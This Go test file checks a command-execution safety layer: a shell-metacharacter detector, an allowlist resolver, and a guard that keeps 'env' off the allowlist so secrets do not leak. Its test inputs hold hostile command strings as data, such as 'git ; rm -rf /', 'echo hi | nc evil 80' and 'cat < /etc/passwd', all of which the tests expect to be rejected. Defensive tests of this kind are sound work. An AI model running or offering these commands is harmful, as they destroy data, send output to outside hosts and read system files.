package safeexec

import "testing"

func TestContainsShellMetachars(t *testing.T) {
	cases := []struct {
		in   string
		want bool
	}{
		{"git status", false},
		{"go test ./...", false},
		{"ls -la /tmp", false},
		// Each metachar fires individually.
		{"git ; rm -rf /", true},
		{"echo hi | nc evil 80", true},
		{"echo $(id)", true},
		{"echo `whoami`", true},
		{"ls > /tmp/x", true},
		{"cat < /etc/passwd", true},
		{"echo (sub)", true},
		{"echo {a,b}", true},
		{"git && rm", true},
	}
	for _, tc := range cases {
		if got := ContainsShellMetachars(tc.in); got != tc.want {
			t.Errorf("ContainsShellMetachars(%q)=%v want %v", tc.in, got, tc.want)
		}
	}
}

func TestResolve_EmptyReturnsFalse(t *testing.T) {
	if _, _, ok := Resolve(""); ok {
		t.Error("empty command should return ok=false")
	}
	if _, _, ok := Resolve("   "); ok {
		t.Error("whitespace-only command should return ok=false")
	}
}

func TestResolve_DisallowedBaseReturnsFalse(t *testing.T) {
	// `env` is explicitly excluded from AllowedCommands; using it
	// here proves the basename check fires even when the binary
	// definitely exists on PATH.
	if _, _, ok := Resolve("env FOO=bar git status"); ok {
		t.Error("`env` should not be allowed")
	}
	// Random non-allowlisted binary.
	if _, _, ok := Resolve("rm -rf /tmp/foo"); ok {
		t.Error("`rm` is not in the allowlist")
	}
}

func TestResolve_AllowedBaseFromAllowedPrefix(t *testing.T) {
	// Pick a binary very likely to be installed under a standard
	// prefix on macOS + Linux dev boxes.
	abs, args, ok := Resolve("ls -la /tmp")
	if !ok {
		t.Skip("ls not resolvable on this host; skipping happy-path assertion")
	}
	if abs == "" {
		t.Error("absPath empty on success")
	}
	if len(args) != 2 || args[0] != "-la" || args[1] != "/tmp" {
		t.Errorf("args=%v want [-la /tmp]", args)
	}
}

func TestResolve_BasenameStripsPath(t *testing.T) {
	// Pre-extraction the resolver split the command, basename'd
	// the first token, then re-looked up via exec.LookPath. That
	// means "ls" and "/some/other/path/ls" should resolve
	// identically — the path component is discarded.
	abs1, _, ok1 := Resolve("ls")
	abs2, _, ok2 := Resolve("/random/dir/ls")
	if ok1 != ok2 {
		t.Errorf("ok mismatch: bare=%v explicit-path=%v", ok1, ok2)
	}
	if ok1 && abs1 != abs2 {
		t.Errorf("abs mismatch: bare=%q explicit-path=%q", abs1, abs2)
	}
}

func TestAllowlist_ExcludesEnv(t *testing.T) {
	// `env` MUST NOT slip into the allowlist — it'd leak secrets.
	// Defensive regression test in case someone alphabetises the
	// list and accidentally adds it.
	for _, c := range AllowedCommands {
		if c == "env" {
			t.Fatal("AllowedCommands must not contain `env` — would leak ANTHROPIC_API_KEY etc.")
		}
	}
}
